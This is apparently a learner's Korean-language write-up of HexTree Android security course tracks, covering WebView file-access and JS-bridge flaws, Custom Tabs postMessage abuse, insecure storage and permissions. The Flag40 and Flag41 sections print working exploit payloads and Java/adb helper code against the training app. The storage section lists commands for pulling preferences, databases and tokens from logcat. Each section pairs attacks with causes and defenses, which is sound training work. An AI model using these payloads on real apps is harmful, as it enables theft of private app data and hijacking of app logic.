JsObject를 "hextree" 이름으로 addJavascriptInterface()
WebView.loadUrl(URL)
5초 뒤 token.txt를 비우고 화면 종료
```

문제가 되는 WebView 설정은 다음 세 가지였다.

```java
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
```

Android 공식 문서 기준으로 `setAllowFileAccess()`는 WebView의 file system 접근을 켜고 끄는 설정이다. 또한 `setAllowFileAccessFromFileURLs()`와 `setAllowUniversalAccessFromFileURLs()`는 API 30에서 deprecated 되었고, 보안상 안전하지 않으므로 `WebViewAssetLoader` 사용이 권장된다. 특히 공식 문서는 외부 소스가 만든 파일을 `file://` 컨텍스트에서 열면 악성 스크립트가 앱 private data 같은 로컬 파일에 접근할 수 있다고 경고한다. [Android Developers: WebSettings](https://developer.android.com/reference/android/webkit/WebSettings)

`Flag40WebViewsActivity`는 실행 시점에 랜덤 token을 생성해 앱 내부 파일에 쓴다.

```text
/data/data/io.hextree.attacksurface/files/token.txt
```

그리고 JS bridge에는 다음 메서드가 있었다.

```text
hextree.authCallback(String token)
```

이 메서드는 전달받은 값이 비어 있지 않으면 `token.txt`를 읽고, 전달된 값과 파일 내용이 일치할 때 `success()`를 호출한다.

```text
authCallback(input):
  timeout callback 제거
  input이 blank이면 return
  savedToken = readFile("token.txt")
  writeFile("token.txt", "")
  if savedToken == input:
      success()
```

따라서 공격 목표는 WebView 안의 JavaScript로 `token.txt`를 읽고, 그 값을 그대로 `hextree.authCallback()`에 넘기는 것이다.

처음에는 `data:` URL에서 바로 다음 payload를 실행하려 했지만, `file://` read가 실패했다.

```html
<script>
fetch("file:///data/data/io.hextree.attacksurface/files/token.txt")
  .then(response => response.text())
  .then(token => hextree.authCallback(token));
</script>
```

그래서 공격 HTML 자체를 target app의 `files/` 디렉터리에 심고, 그 파일을 `file://` URL로 로드하는 방식으로 바꿨다. 이때 이전 Content/FileProvider 트랙에서 확인한 `Flag35Activity`의 writable FileProvider URI를 재사용했다.

작성한 payload는 다음과 같다.

```html
<!doctype html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function () {
  hextree.authCallback(xhr.responseText);
};
xhr.onerror = function () {
  hextree.authCallback("");
};
xhr.open("GET", "file:///data/data/io.hextree.attacksurface/files/token.txt", true);
xhr.send();
</script>
</body>
</html>
```

PoC helper는 다음 순서로 동작한다.

```text
1. Flag35Activity에 filename=flag40-payload.html로 startActivityForResult()
2. 반환된 content://io.hextree.root/.../files/flag40-payload.html URI에 HTML payload 쓰기
3. Flag40WebViewsActivity를 URL=file:///data/data/io.hextree.attacksurface/files/flag40-payload.html로 실행
4. payload JS가 token.txt를 XHR로 읽음
5. hextree.authCallback(token) 호출
```

helper Activity 핵심 코드는 다음과 같다.

```java
request.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag35Activity"));
request.putExtra("filename", "flag40-payload.html");
startActivityForResult(request, REQUEST_CODE);
```

반환된 URI에 payload를 쓴 뒤 Flag40 WebView를 실행했다.

```java
OutputStream out = getContentResolver().openOutputStream(uri, "wt");
out.write(PAYLOAD_HTML.getBytes(StandardCharsets.UTF_8));

Intent startFlag40 = new Intent();
startFlag40.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"));
startFlag40.putExtra("URL",
        "file:///data/data/io.hextree.attacksurface/files/flag40-payload.html");
startActivity(startFlag40);
```

실행 로그는 다음 형태였다.

```text
Flag40PlantPoC: Wrote Flag40 payload bytes=316 url=file:///data/data/io.hextree.attacksurface/files/flag40-payload.html
Flag40PlantPoC: Starting Flag40WebViewsActivity URL=file:///data/data/io.hextree.attacksurface/files/flag40-payload.html
Flag40: authCallback("<token>")
Flag40WebViewsActivity: success()
Flag40: success() called!
Flag40: HXT{...}
```

#### 취약 원인

이 문제의 핵심은 외부에서 조작 가능한 URL을 WebView에 로드하면서 file access 관련 제한을 풀어둔 것이다. `file://` origin에서 실행되는 JavaScript가 다른 local file을 읽을 수 있게 되었고, 그 대상이 앱 private directory의 `token.txt`였다.

추가로 `addJavascriptInterface()`가 결합되어 파일을 읽는 것에서 끝나지 않고, 읽은 token을 native bridge로 전달해 앱 내부 성공 로직까지 실행할 수 있었다. 즉 WebView 설정 취약점과 JS bridge 노출이 합쳐진 케이스다.

#### 방어 방안

- 외부 입력 URL을 그대로 `WebView.loadUrl()`에 넘기지 않는다.
- `file://` URL 로딩을 피하고, 필요하면 `androidx.webkit.WebViewAssetLoader`를 사용한다.
- `setAllowFileAccess(false)`를 명시하고, `setAllowFileAccessFromFileURLs(true)`, `setAllowUniversalAccessFromFileURLs(true)`는 사용하지 않는다.
- 앱 내부 private file을 인증 토큰처럼 검증에 쓰는 경우, WebView에서 접근 가능한 경로와 분리한다.
- WebView에 native bridge를 붙일 때는 페이지 출처 검증과 bridge method 내부 권한 검증을 함께 적용한다.

### 4. Modern WebViews, Custom Tabs, TWA

#### Flag 41 — Custom Tabs `postMessage` 통신 흐름 악용

Flag41은 WebView가 아니라 Chrome Custom Tabs 기반 문제였다. Custom Tabs는 앱 내부에 `WebView` 객체를 직접 두는 방식이 아니라, 브라우저 앱과 `CustomTabsSession`을 맺고 브라우저가 웹 페이지를 렌더링한다. AndroidX 문서 기준으로 `CustomTabsSession`은 Custom Tabs 관련 통신을 처리하는 클래스이고, `requestPostMessageChannel()`은 앱과 브라우저 사이의 양방향 `postMessage` 채널 생성을 요청한다. `postMessage()`는 이 채널이 준비된 뒤 메시지를 보낼 때 사용된다. [AndroidX: CustomTabsSession](https://developer.android.com/reference/androidx/browser/customtabs/CustomTabsSession)

Chrome for Developers 문서에서도 이 흐름을 다음 단계로 설명한다.

```text
CustomTabsService에 bind
CustomTabsSession 생성
validateRelationship() 결과 확인
navigation finished 이후 requestPostMessageChannel()
onMessageChannelReady() 이후 postMessage()
웹 페이지는 window message event에서 MessagePort를 받아 port.postMessage()로 앱에 응답
```

참고로 해당 문서는 메시지를 받을 때 `event.origin` 등을 검증하라고 경고한다. 임의 사이트에서 보낸 메시지를 신뢰하면 웹 콘텐츠가 앱의 내부 흐름을 조작할 수 있기 때문이다. [Chrome for Developers: PostMessage for TWA](https://developer.chrome.com/docs/android/post-message-twa)

정적 분석 결과 대상 Activity는 다음이었다.

```text
io.hextree.attacksurface.activities.Flag41Activity
```

manifest에서는 exported 상태였다.

```text
activity io.hextree.attacksurface.activities.Flag41Activity
  exported=true
```

`Flag41Activity.onCreate()`는 외부 Intent에서 `URL` extra를 읽고, 값이 없으면 기본 동기화 페이지를 사용한다.

```java
String url = getIntent().getStringExtra("URL");
if (url == null) {
    url = "https://oak.hackstree.io/android/webview/sync.html";
}
Uri uri = Uri.parse(url);
```

서비스 연결이 되면 Chrome Custom Tabs service에 bind하고, 고정 origin에 대해 relationship 검증을 요청한다.

```java
session = client.newSession(callback);
session.validateRelationship(
        CustomTabsService.RELATION_USE_AS_ORIGIN,
        Uri.parse("https://oak.hackstree.io/"),
        null);
```

이후 navigation 완료 이벤트가 발생하고 검증 결과가 true이면 postMessage 채널을 요청한다.

```java
if (navigationEvent == NAVIGATION_FINISHED && session != null && validated) {
    session.requestPostMessageChannel(Uri.parse("https://oak.hackstree.io/"));
}
```

채널이 준비되면 앱은 먼저 `"init"` 메시지를 보낸다.

```java
public void onMessageChannelReady(Bundle extras) {
    session.postMessage("init", null);
}
```

취약점은 수신 메시지를 처리하는 `onPostMessage()` 쪽에 있었다. JSON의 `message` 값만 보고 내부 상태를 변경하거나 성공 처리를 한다.

```text
message == "init_complete"
  -> initialised = true

message == "get_solved_count"
  -> solved count를 웹 페이지로 전송

message == "get_solved_flags"
  -> solved flag map을 웹 페이지로 전송

message == "success" && initialised == true
  -> success()
```

즉 공격 페이지가 MessagePort를 얻은 뒤 먼저 `init_complete`를 보내고, 그 다음 `success`를 보내면 된다.

#### PoC

처음에는 기본 페이지의 `SYNC STATE` 버튼을 눌러 확인했지만, 앱 로그에는 성공 메시지가 오지 않았다. 그래서 별도 payload 페이지를 만들었다.

```html
window.addEventListener("message", (event) => {
  if (!event.ports || event.ports.length === 0) return;

  const port = event.ports[0];

  port.postMessage(JSON.stringify({ message: "init_complete" }));

  setTimeout(() => {
    port.postMessage(JSON.stringify({ message: "success" }));
  }, 500);
});
```

실습에서는 로컬 HTTP 서버로 payload를 제공했다.

```powershell
python -m http.server 8088 --bind 127.0.0.1 --directory outputs
```

에뮬레이터에서 Windows host의 localhost는 `10.0.2.2`로 접근할 수 있으므로, 다음 URL을 `Flag41Activity`에 넘겼다.

```powershell
adb shell am start `
  -n io.hextree.attacksurface/.activities.Flag41Activity `
  -e URL http://10.0.2.2:8088/flag41-postmessage-payload.html
```

중요한 시행착오는 타이밍이었다. 첫 번째 navigation 완료 이벤트가 relationship 검증 완료보다 먼저 발생하면 `requestPostMessageChannel()`이 호출되지 않았다. 그래서 payload 페이지에서 한 번 자동 reload를 걸어, 검증이 끝난 뒤 navigation finished 이벤트가 다시 발생하도록 했다.

```javascript
if (params.get("reload") !== "1") {
  setTimeout(() => {
    location.href = location.pathname + "?reload=1";
  }, 2000);
}
```

실행 후 `logcat`에서 다음 흐름을 확인했다.

```text
Flag41: onRelationshipValidationResult(true, "https://oak.hackstree.io")
Flag41: requestPostMessageChannel = true
Flag41: onMessageChannelReady(Bundle is null)
Flag41: onPostMessage({"message":"init_complete"}, ...)
Flag41: Website is ready
Flag41: onPostMessage({"message":"success"}, ...)
Flag41: success() called!
Flag41: HXT{...}
```

#### 취약 원인

핵심 원인은 Custom Tabs로 열 URL을 외부 Intent extra에서 받으면서, postMessage 수신 메시지의 실제 origin과 신뢰성을 강하게 검증하지 않은 점이다. 로그에서도 `POST_MESSAGE_ORIGIN`이 로컬 payload origin으로 표시됐지만, 앱은 origin 값을 검증하지 않고 JSON의 `message` 값만으로 `initialised` 상태와 `success()` 호출 여부를 결정했다.

또한 성공 조건이 단순한 상태 머신이었다. 웹 페이지가 `"init_complete"`를 보내면 앱은 웹사이트가 준비됐다고 판단하고, 이후 `"success"` 메시지를 받으면 플래그를 출력했다. 이 구조에서는 공격자가 MessagePort만 획득하면 앱 내부 성공 로직을 직접 유도할 수 있다.

#### 방어 방안

- Custom Tabs로 열 수 있는 URL을 신뢰 가능한 origin으로 제한한다.
- `requestPostMessageChannel()` 사용 시 source origin과 target origin을 명확히 분리하고, 가능하면 target origin까지 지정한다.
- `onPostMessage()`에서 `POST_MESSAGE_ORIGIN` 또는 equivalent origin 정보를 확인한다.
- 메시지 타입만으로 민감 동작을 실행하지 말고, nonce/session token 같은 앱이 생성한 challenge를 검증한다.
- 웹 페이지가 요청하는 `get_solved_flags`처럼 민감 정보 반환 기능은 디버그/실습 환경이 아니면 제거한다.

### 5. 배운 점

- WebView는 단순 화면 렌더링 컴포넌트가 아니라, 설정에 따라 앱 내부 기능과 웹 콘텐츠를 연결하는 공격 표면이 된다.
- `addJavascriptInterface()`로 등록된 객체는 JavaScript에서 지정된 이름으로 접근할 수 있다.
- `@JavascriptInterface`가 붙은 public method는 WebView 안의 JavaScript에서 호출 가능하다.
- exported Activity가 외부 URL을 받아 WebView에 로드하면, 공격자가 직접 payload 페이지를 주입할 수 있다.
- JavaScript 활성화, 외부 URL 로딩, native bridge 노출이 함께 존재하면 위험도가 크게 올라간다.
- WebView XSS는 `addJavascriptInterface()`와 결합될 때 앱 내부 Java/Kotlin 메서드 호출로 확장될 수 있다.
- `file://` 기반 WebView 로딩과 file access 허용 설정은 앱 private file 노출로 이어질 수 있다.
- WebView 취약점은 이전 트랙의 FileProvider 취약점과 조합될 수 있으므로, 컴포넌트별 취약점만 따로 보지 말고 앱 전체 흐름으로 봐야 한다.
- Custom Tabs는 WebView보다 격리된 구조지만, `CustomTabsSession`과 `postMessage`를 사용하면 웹 페이지가 앱 로직과 다시 연결된다.
- `postMessage` 수신부에서는 메시지 포맷뿐 아니라 보낸 origin과 세션 상태를 검증해야 한다.

### 참고 자료

1. [HexTree: Android WebViews](https://app.hextree.io/courses/android-webviews)
2. [HexTree: JavascriptInterface](https://app.hextree.io/courses/android-webviews/webview-misconfigurations/javascriptinterface)
3. [HexTree: Cross-Site Scripting in WebViews](https://app.hextree.io/courses/android-webviews/webview-misconfigurations/cross-site-scripting-in-webviews)
4. [HexTree: Stealing App Internal Files](https://app.hextree.io/courses/android-webviews/webview-misconfigurations/stealing-app-internal-files)
5. [HexTree: Post Message Communication](https://app.hextree.io/courses/android-webviews/modern-webviews-ct-and-twa/post-message-communication)
6. [Android Developers: WebView.addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String))
7. [Android Developers: JavascriptInterface](https://developer.android.com/reference/android/webkit/JavascriptInterface)
8. [Android Developers: WebSettings](https://developer.android.com/reference/android/webkit/WebSettings)
9. [AndroidX: CustomTabsSession](https://developer.android.com/reference/androidx/browser/customtabs/CustomTabsSession)
10. [Chrome for Developers: PostMessage for TWA](https://developer.chrome.com/docs/android/post-message-twa)


---

## HexTree Android Track — Android (Insecure) Storage

### 1. 트랙 개요

이 트랙에서는 Android 앱이 데이터를 저장하는 위치와, 저장 위치 선택이 보안에 어떤 영향을 주는지 정리했다. 핵심 관점은 “앱이 로컬에 남긴 데이터가 누가, 어떤 조건에서, 어떤 도구로 읽을 수 있는가”이다.

Android 공식 문서 기준으로 앱 데이터 저장 방식은 크게 app-specific storage, shared storage, preferences, database로 나뉜다. 민감한 데이터는 다른 앱이 접근하면 안 되므로 internal app-specific storage, preferences, database처럼 앱 전용 영역을 사용해야 한다. [Android Developers: Data and file storage overview](https://developer.android.com/training/data-storage)

### 2. 분석 환경

- 대상 과정: HexTree Android (Insecure) Storage
- 과정 링크: <https://app.hextree.io/courses/insecure-storage>
- 테스트 기기: Android Emulator `emulator-5554`
- 분석 관점:
  - 앱 내부 저장소(`/data/data/<package>/`)
  - SharedPreferences
  - SQLite/database 파일
  - cache file
  - external/shared storage
  - backup/debug/logcat로 남는 민감 데이터

### 3. 핵심 개념

#### Internal app-specific storage

Android는 앱별 internal storage 디렉터리를 제공한다. 공식 문서에 따르면 internal storage의 app-specific directory는 다른 앱이 접근할 수 없고, Android 10(API 29) 이상에서는 암호화된다. 따라서 앱만 접근해야 하는 민감 데이터는 이 영역이 기본 선택지가 된다. [Android Developers: Access app-specific files](https://developer.android.com/training/data-storage/app-specific)

대표 경로는 다음과 같다.

```text
/data/data/<package_name>/files/
/data/data/<package_name>/cache/
/data/data/<package_name>/shared_prefs/
/data/data/<package_name>/databases/
```

단, “internal storage에 있다”는 사실만으로 안전하다고 단정하면 안 된다. 루팅된 기기, 디버그 빌드, 잘못된 backup 설정, 취약한 ContentProvider/FileProvider, WebView file access 취약점과 결합되면 내부 파일도 노출될 수 있다.

#### SharedPreferences

SharedPreferences는 key-value 형태의 작은 설정값을 저장하는 기능이다. Android 보안 권장 문서는 `getSharedPreferences()`를 사용할 때 `MODE_PRIVATE`를 사용하라고 설명한다. 이 모드는 해당 앱만 preference 파일에 접근하도록 제한한다. [Android Developers: Improve your app's security](https://developer.android.com/privacy-and-security/security-best-practices)

문제는 많은 앱이 token, password, session id, user profile 같은 민감 값을 평문 SharedPreferences에 저장한다는 점이다. 앱 sandbox가 깨지거나 백업/디버그/취약 Provider 경로가 열리면 XML 파일에서 값이 그대로 노출된다.

예시 점검 경로:

```text
/data/data/<package_name>/shared_prefs/*.xml
```

#### SQLite / Database

Android 공식 문서는 구조화된 데이터 저장에는 Room persistence library 같은 database 방식을 사용할 수 있다고 설명한다. [Android Developers: Data and file storage overview](https://developer.android.com/training/data-storage)

SQLite 자체는 저장 구조일 뿐 암호화 기능을 자동으로 제공하지 않는다. 따라서 DB 파일에 access token, refresh token, 개인정보, 결제 정보가 평문으로 저장되어 있으면 저장소 취약점이 된다.

예시 점검 경로:

```text
/data/data/<package_name>/databases/*.db
```

점검 시에는 table 목록, schema, 민감 컬럼명, 평문 값 여부를 확인한다.

```shell
sqlite3 target.db ".tables"
sqlite3 target.db ".schema"
sqlite3 target.db "select * from <table> limit 5;"
```

#### Cache file

cache directory는 임시 데이터를 저장하기 위한 공간이다. Android 문서는 내부 cache도 app-specific storage에 속하지만, 시스템이 저장 공간 회수를 위해 cache file을 더 빨리 삭제할 수 있다고 설명한다. [Android Developers: Access app-specific files](https://developer.android.com/training/data-storage/app-specific)

보안 관점에서는 cache에 민감 데이터가 남는지 확인해야 한다. 예를 들어 API response, 이미지 원본, 문서 preview, 인증 응답 JSON이 cache에 평문으로 남으면 로그아웃 후에도 복구 가능할 수 있다.

예시 점검 경로:

```text
/data/data/<package_name>/cache/
/sdcard/Android/data/<package_name>/cache/
```

#### External / shared storage

Android 공식 문서 기준으로 shared storage는 다른 앱과 공유할 의도가 있는 media, documents, 기타 파일에 사용한다. 반대로 앱만 사용해야 하는 민감 데이터는 external/shared storage에 두면 안 된다. [Android Developers: Data and file storage overview](https://developer.android.com/training/data-storage)

Android 10 이후 scoped storage가 도입되어 외부 저장소 접근 범위가 줄었지만, 다음 이유로 여전히 점검 대상이다.

- 오래된 target SDK 또는 오래된 Android 버전에서는 접근 범위가 넓을 수 있다.
- 사용자가 직접 파일을 볼 수 있다.
- 백업/파일 관리자/USB 연결로 파일이 쉽게 노출될 수 있다.
- 앱이 불필요하게 `MANAGE_EXTERNAL_STORAGE` 같은 광범위 권한을 요청할 수 있다.

### 4. 점검 절차

교육용 에뮬레이터 또는 권한이 있는 테스트 기기에서만 수행한다.

```powershell
adb devices
adb shell pm list packages | findstr hextree
adb shell run-as <package_name> ls -la /data/data/<package_name>/
adb shell run-as <package_name> find /data/data/<package_name>/ -type f
```

`run-as`는 앱이 debuggable일 때 유용하다. 동작하지 않으면 root 권한이 있는 에뮬레이터에서 확인하거나, 앱이 노출한 백업/Provider/파일 공유 경로를 별도로 분석한다.

SharedPreferences 확인:

```powershell
adb shell run-as <package_name> ls -la shared_prefs
adb shell run-as <package_name> cat shared_prefs/<file>.xml
```

DB 확인:

```powershell
adb shell run-as <package_name> ls -la databases
adb shell run-as <package_name> cat databases/<db_file> > pulled.db
```

External storage 확인:

```powershell
adb shell find /sdcard/Android/data/<package_name>/ -type f
adb shell find /sdcard/Download -type f
```

Logcat 확인:

```powershell
adb logcat -d | findstr /i "token password secret auth session"
```

### 5. 취약 원인 정리

Insecure Storage 취약점의 공통 원인은 민감 데이터가 저장 위치의 신뢰 수준보다 더 높은 보호를 요구하는데도 평문으로 남는 것이다.

대표 패턴:

- access token 또는 refresh token을 평문 SharedPreferences에 저장
- 사용자 비밀번호, PIN, 복구 코드 등을 파일/DB에 저장
- API response 전체를 cache에 그대로 저장
- 로그아웃 후에도 민감 파일을 삭제하지 않음
- external/shared storage에 앱 내부 데이터 저장
- backup 대상에서 민감 파일을 제외하지 않음
- debug log에 token, secret, session 값을 출력

### 6. 방어 방안

- 민감 데이터는 가능한 한 로컬에 저장하지 않는다.
- 꼭 저장해야 하면 internal app-specific storage를 사용하고, 평문 저장을 피한다.
- token은 수명과 scope를 줄이고, 로그아웃 시 삭제한다.
- SharedPreferences에는 민감 값을 그대로 넣지 않는다.
- DB에는 필요한 최소 정보만 저장하고, 민감 컬럼은 암호화 또는 서버 재검증 구조로 보호한다.
- cache에는 인증 응답, 개인정보, 문서 원본을 남기지 않는다.
- external/shared storage는 사용자 공유 목적의 비민감 파일에만 사용한다.
- `adb backup`, Android Auto Backup, debug build, logcat 출력까지 포함해 데이터 잔존 여부를 확인한다.

### 7. 배운 점

- 저장소 취약점은 “어디에 저장했는가”와 “누가 읽을 수 있는가”를 같이 봐야 한다.
- internal storage는 기본적으로 앱 sandbox로 보호되지만, 다른 취약점과 결합되면 노출될 수 있다.
- SharedPreferences와 SQLite는 편리하지만, 민감 데이터를 평문으로 저장하면 분석자가 쉽게 읽을 수 있다.
- cache와 logcat은 개발자가 놓치기 쉬운 데이터 잔존 지점이다.
- 앱 보안 분석에서는 화면/IPC 공격 표면뿐 아니라 로컬에 남는 흔적까지 확인해야 한다.

### 참고 자료

1. [HexTree: Android (Insecure) Storage](https://app.hextree.io/courses/insecure-storage)
2. [Android Developers: Data and file storage overview](https://developer.android.com/training/data-storage)
3. [Android Developers: Access app-specific files](https://developer.android.com/training/data-storage/app-specific)
4. [Android Developers: Improve your app's security](https://developer.android.com/privacy-and-security/security-best-practices)


---

## HexTree Android Track — Android Permissions

### 1. 트랙 개요

이 트랙에서는 Android 권한 모델이 앱의 공격 표면을 어떻게 제한하거나, 반대로 잘못 쓰였을 때 어떻게 우회 지점이 되는지 정리했다. 지금까지 다룬 Activity, Service, BroadcastReceiver, ContentProvider는 모두 외부 앱과 상호작용할 수 있는 컴포넌트이고, 권한은 이 컴포넌트에 접근 제어를 거는 핵심 수단이다.

Android 공식 문서 기준으로 앱 권한은 제한된 데이터와 제한된 작업에 대한 접근을 보호한다. 예를 들어 연락처, 위치, 마이크, 카메라 같은 민감 데이터/기능은 권한 모델을 통해 통제된다. [Android Developers: Permissions on Android](https://developer.android.com/guide/topics/permissions/overview)

### 2. 분석 환경

- 대상 과정: HexTree Android Permissions
- 과정 링크: <https://app.hextree.io/courses/android-permissions>
- 테스트 기기: Android Emulator `emulator-5554`
- 분석 관점:
  - Manifest의 `<uses-permission>`
  - custom permission 선언
  - permission `protectionLevel`
  - Activity/Service/Receiver/Provider에 걸린 permission
  - runtime permission granted/denied 상태
  - 권한이 있는 앱을 통한 confused deputy 가능성

### 3. 핵심 개념

#### Permission은 앱 기능 접근 제어 장치다

Android 앱은 기본적으로 sandbox 안에서 실행된다. 자기 sandbox 밖의 제한된 데이터나 시스템 기능을 사용하려면 권한을 선언하고, 위험 권한의 경우 런타임에 사용자 승인을 받아야 한다. Android 문서는 위험 권한을 사용할 때 매번 권한 보유 여부를 확인하고 필요한 경우 요청하라고 설명한다. [Android Developers: Request runtime permissions](https://developer.android.com/training/permissions/requesting)

기본 흐름은 다음과 같다.

```text
AndroidManifest.xml에 필요한 권한 선언
기능 실행 시점에 권한 보유 여부 확인
위험 권한이면 runtime permission dialog 요청
사용자 응답 처리
권한 거부 시 기능 제한 또는 대체 흐름 제공
```

#### 권한 타입

Android의 권한은 위험도와 부여 방식에 따라 다르게 동작한다. 공식 `<permission>` 문서의 핵심 분류는 다음과 같다. [Android Developers: <permission>](https://developer.android.com/guide/topics/manifest/permission-element)

| protectionLevel | 의미 | 보안 관점 |
|---|---|---|
| `normal` | 낮은 위험의 권한. 설치 시 자동 부여 | 민감 기능 보호에는 부적합 |
| `dangerous` | 사용자 private data 또는 기기 제어에 영향 | 런타임 승인 필요. 사용자 동의 UI가 보안 경계의 일부가 됨 |
| `signature` | 같은 서명 인증서로 서명된 앱에만 부여 | 같은 개발자 앱 사이의 강한 접근 제어에 적합 |
| `knownSigner` | 허용된 signer 목록에 있는 앱에 부여 | 특정 signer allowlist 기반 접근 제어 |

실습 관점에서 중요한 것은 “권한이 선언되어 있다”가 아니라 “그 권한이 실제로 보호해야 할 컴포넌트/API에 걸려 있는가”이다.

#### Manifest에서 확인할 지점

권한 분석은 Manifest에서 시작한다.

```xml
<uses-permission android:name="android.permission.CAMERA" />

<permission
    android:name="com.example.PRIVATE_API"
    android:protectionLevel="signature" />

<service
    android:name=".SensitiveService"
    android:exported="true"
    android:permission="com.example.PRIVATE_API" />
```

점검 포인트는 다음이다.

- 앱이 어떤 system permission을 요청하는가
- custom permission을 직접 선언하는가
- custom permission의 `protectionLevel`이 적절한가
- exported component에 `android:permission`이 걸려 있는가
- receiver에는 `sendBroadcast()`/`registerReceiver()` 호출 쪽 권한 검증도 있는가
- provider에는 `readPermission`, `writePermission`, `grantUriPermissions` 설정이 적절한가

### 4. 취약 패턴

#### 1) 민감 컴포넌트가 exported인데 permission이 없음

가장 직접적인 문제는 Activity, Service, Receiver, Provider가 외부 공개 상태인데 접근 권한이 없는 경우다.

```xml
<service
    android:name=".AdminService"
    android:exported="true" />
```

이 경우 다른 앱이 명시적 Intent, bindService, broadcast, ContentResolver 요청으로 컴포넌트에 접근할 수 있다. 공개가 필요한 컴포넌트라면 호출자 검증 또는 permission이 필요하다.

#### 2) custom permission을 `normal` 또는 `dangerous`로 선언

앱 내부 private API 보호 목적이라면 `signature` permission이 더 적합하다. Android 보안 체크리스트도 새 권한을 만들 필요가 있다면 signature protection level을 고려하라고 설명한다. [Android Developers: Security checklist](https://developer.android.com/privacy-and-security/security-tips)

`normal` 권한은 설치 시 자동 부여되므로 민감 컴포넌트 보호에 충분하지 않다. `dangerous` 권한은 사용자 승인 UI에 의존하므로, 같은 개발자 앱 사이의 내부 API 보호 목적에는 불필요하게 넓다.

#### 3) 권한을 요청했지만 사용 직전 확인하지 않음

Runtime permission은 사용자가 나중에 설정에서 회수할 수 있다. 공식 문서는 권한이 필요한 작업을 수행할 때마다 권한 보유 여부를 확인해야 한다고 설명한다. [Android Developers: Request runtime permissions](https://developer.android.com/training/permissions/requesting)

취약하거나 불안정한 구현은 다음과 같다.

```java
// 앱 시작 시 한 번만 확인하고 이후에는 granted라고 가정
if (hasLocationPermissionAtStartup) {
    readLocation();
}
```

안전한 흐름은 민감 API 호출 직전에 다시 확인하는 것이다.

```java
if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
        == PackageManager.PERMISSION_GRANTED) {
    readLocation();
}
```

#### 4) 권한 있는 앱이 대리자로 악용됨

권한을 가진 앱이 외부 Intent를 받아 그대로 민감 API를 호출하면, 권한이 없는 앱이 권한 있는 앱을 프록시처럼 사용할 수 있다. 이것은 confused deputy 패턴이다.

예시:

```text
공격 앱 → exported Activity 호출
권한 있는 대상 앱 → 권한 검사 없이 Contacts/Location/Provider 접근
대상 앱 → 결과를 Intent result, broadcast, log, WebView 등으로 노출
```

즉 Android permission은 “호출자가 권한이 있는가”뿐 아니라 “권한을 가진 내 앱이 외부 입력으로 어떤 행동을 대신 해주는가”까지 봐야 한다.

### 5. 점검 명령

권한과 컴포넌트 상태 확인:

```powershell
adb shell dumpsys package <package_name>
```

runtime permission 상태 확인:

```powershell
adb shell dumpsys package <package_name> | findstr /i "runtime permissions granted denied"
```

권한 부여/회수 테스트:

```powershell
adb shell pm grant <package_name> android.permission.POST_NOTIFICATIONS
adb shell pm revoke <package_name> android.permission.POST_NOTIFICATIONS
```

permission denial 상태 초기화:

```powershell
adb shell pm clear-permission-flags <package_name> <permission_name> user-set user-fixed
```

Manifest 기준 정적 확인:

```powershell
aapt dump xmltree base.apk AndroidManifest.xml
```

확인할 키워드:

```text
uses-permission
permission
protectionLevel
exported
readPermission
writePermission
grantUriPermissions
```

이 파일에는 임의 flag 값을 넣지 않는다. Android Permissions 트랙은 이후 컴포넌트별 공격 표면 분석에서 “외부 호출 가능 여부”와 “권한으로 접근이 제한되는지”를 판단하는 기준으로 사용한다.

### 6. 방어 방안

- 외부 공개가 필요 없는 컴포넌트는 `android:exported="false"`로 둔다.
- 외부 공개가 필요한 컴포넌트에는 목적에 맞는 permission을 건다.
- 같은 개발자 앱 사이의 내부 API 보호에는 `signature` permission을 우선 고려한다.
- `normal` permission을 민감 기능 보호 수단으로 사용하지 않는다.
- runtime permission은 민감 API 호출 직전에 매번 확인한다.
- 권한 거부/회수 시 앱이 안전하게 기능을 제한하도록 구현한다.
- exported component가 외부 입력을 받아 권한 있는 API를 대신 호출하는 구조인지 점검한다.
- Provider는 `readPermission`, `writePermission`, URI grant 범위를 분리해 최소 권한으로 설계한다.

### 7. 배운 점

- Android permission은 단순히 사용자에게 권한 팝업을 띄우는 기능이 아니라 앱 간 접근 제어 모델이다.
- `exported=true` 컴포넌트에 권한이 없으면 외부 앱이 직접 공격 표면으로 사용할 수 있다.
- custom permission은 `protectionLevel` 선택이 핵심이다.
- 런타임 권한은 한 번 승인됐다고 영구적으로 신뢰하면 안 된다.
- 권한을 가진 앱이 외부 요청을 검증 없이 처리하면, 권한 없는 앱의 대리 실행 경로가 된다.

### 참고 자료

1. [HexTree: Android Permissions](https://app.hextree.io/courses/android-permissions)
2. [Android Developers: Permissions on Android](https://developer.android.com/guide/topics/permissions/overview)
3. [Android Developers: Request runtime permissions](https://developer.android.com/training/permissions/requesting)
4. [Android Developers: `<permission>` manifest element](https://developer.android.com/guide/topics/manifest/permission-element)
5. [Android Developers: Security checklist](https://developer.android.com/privacy-and-security/security-tips)


---

## HexTree Android Track — Bluetooth Reverse Engineering Basics

### 1. 트랙 개요

이 트랙에서는 Android 앱이 Bluetooth Low Energy(BLE) 기기와 통신할 때 어떤 정보가 앱 코드와 런타임 트래픽에 남는지 정리했다. 기존 트랙들이 Activity, Intent, Provider, WebView처럼 앱 내부/앱 간 공격 표면을 다뤘다면, Bluetooth reversing은 앱 바깥의 주변 기기와 연결되는 프로토콜 경계를 보는 과정이다.

Android 공식 문서 기준으로 Android는 BLE central 역할을 지원하며, 앱은 BLE 기기를 검색하고, GATT server에 연결하고, service와 characteristic을 조회한 뒤 데이터를 송수신할 수 있다. [Android Developers: Bluetooth Low Energy](https://developer.android.com/develop/connectivity/bluetooth/ble/ble-overview)

### 2. 분석 환경

- 대상 과정: HexTree Bluetooth Reverse Engineering Basics
- 과정 링크: <https://app.hextree.io/courses/android-bluetooth-reversing>
- 분석 관점:
  - Android 앱의 Bluetooth permission
  - BLE scan / connect 흐름
  - GATT service UUID
  - characteristic UUID와 property
  - read / write / notify 동작
  - 앱 코드에 hardcoded된 UUID, command, token, protocol constant

### 3. 핵심 개념

#### BLE 역할: central / peripheral

